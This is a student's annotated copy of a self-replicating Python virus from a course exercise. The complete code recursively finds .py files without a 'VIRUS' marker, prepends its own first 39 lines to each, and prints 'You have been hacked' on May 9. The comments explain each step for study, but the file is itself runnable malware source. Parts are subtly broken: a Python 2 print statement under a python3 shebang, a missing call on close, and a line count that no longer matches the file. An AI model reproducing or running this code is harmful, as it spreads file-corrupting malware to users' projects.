#!/usr/bin/python3

# Script:                       Ops Challenge 14
# Author:                       Kevin Isaac
# Date of latest revision:      20221222
# Purpose:     Perform an analysis of a naughty Python-based code.


import os
import datetime

SIGNATURE = "VIRUS"

def locate(path):
    files_targeted = []
    filelist = os.listdir(path)

    # This will view every file and directory in the "filelist"
    for fname in filelist:
        # Asking if "fname" is a directory
        if os.path.isdir(path+"/"+fname):

            files_targeted.extend(locate(path+"/"+fname))
            # Else if the last 3 characters of the "fname" are equal to ".py"
        elif fname[-3:] == ".py":
            # Vairiable named "infected" with a value of "False"
            infected = False
            # For "line" it opens a file and reads each line
            for line in open(path+"/"+fname):
                # If "SIGNATURE" then continue to next line
                if SIGNATURE in line:
                    # This is changing the variable "Infected" from False to True
                    infected = True
                   #  Breaks out of the forloop
                    break
                # If the variable "infected" then continue to next line
            if infected == False:

                # This will add "path + fname" to "files_targeted"
                files_targeted.append(path+"/"+fname)
    # This retains the variable to be on called on at a later time
    return files_targeted

 # This creates a function called "infect"
def infect(files_targeted):

    # This is a variable called "virus" which opens the file path "open(os.path.abspath(__file__))"
    virus = open(os.path.abspath(__file__))

    # This is an empty variable
    virusstring = ""

    # This is an enumerate funcion
    for i,line in enumerate(virus):
        if 0 <= i < 39:

            # This is a variable called "virusstring" with the value of "line"
            virusstring += line
    virus.close

    # This is a loop that finds, reads, creates and closes files
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

# This will find the path to the files and infect the files targeted
def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print "You have been hacked"

files_targeted = locate(os.path.abspath(""))
infect(files_targeted)
detonate()

# Commenting/analysis attribution: Class Zoom video and classmates
